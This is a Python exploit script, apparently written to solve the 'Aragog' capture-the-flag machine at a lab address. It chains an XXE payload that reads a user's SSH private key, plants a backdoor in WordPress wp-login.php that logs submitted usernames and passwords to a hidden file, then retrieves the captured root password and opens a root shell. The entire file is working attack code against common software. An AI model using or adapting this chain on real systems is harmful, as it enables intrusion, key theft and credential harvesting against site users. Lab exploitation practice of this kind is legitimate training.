#!/usr/bin/python2
#Author: Wh04m1
#Name: aragog_autopwn.py

import requests
from pwn import *
import time
import re
import os

PASS = "/dev/shm/.password"
BACKDOOR = 'backdoor.php'
RFILE = "/var/www/html/dev_wiki/wp-login.php"
BACKDOORCMD = 'file_put_contents("/dev/shm/.password", $_POST[\'log\'] . ":" . $_POST[\'pwd\'] . ' + r'"\n"' + ', FILE_APPEND);'
HOST= '10.10.10.78'
XXE = '''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///home/florian/.ssh/id_rsa" >]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
    <test></test>
</details>'''

try:

	def get_key():
		r = requests.post('http://' +str(HOST) +'/hosts.php', data=XXE)
		with open('id_rsa', 'w') as f:
			f.write(r.text[42:])
			f.close()
			chmod = process(['chmod', '0600', 'id_rsa'])
			key =  r.text[42:]
			return key


	def backdoor():
		s = ssh(host=HOST, user='florian', keyfile='id_rsa')
	       	s.download(RFILE, 'wp-login.php')
		s.close()
		with open("wp-login.php" , "r") as in_file:
			buf = in_file.readlines()
		with open("backdoor.php" , "w") as out_file:
			for line in buf:
				if line == "default:\n":
					line = line + "        " + BACKDOORCMD + "\n"
				out_file.write(line)
		s = ssh(host=HOST, user='florian', keyfile='id_rsa')
		s.put(BACKDOOR, RFILE)
		s.close()
	def get_pass():
	        s = ssh(host=HOST, user='florian', keyfile='id_rsa')
		s.download(PASS, "password.txt")
		s.close()

	def code_exec():
		with open('password.txt' , 'r') as f:
			f = f.read()
			root_pass = re.search(r'A\S+', f).group().split(":")[1]
			s = ssh(host=HOST, user='florian', keyfile='id_rsa' )
			sh = s.process("/bin/bash", tty=True)
			sh.sendline("su -")
			sh.recvuntil('Password:')
			sh.sendline(root_pass)
			sh.sendline("id;hostname;cat /root/root.txt")
			sh.interactive()

	log.info("Getting ssh private key for user Florian")
	get_key()
	backdoor()
	log.info("Waiting for user to login\n\n\n")
	time.sleep(70)
	log.info("Retriving admin password\n\n\n")
	get_pass()
	log.info("Spawning root shell!!!\n\n\n")
	code_exec()
except KeyboardInterrupt:
	r = process(['rm', BACKDOOR , 'wp-config.php', 'id_rsa'])
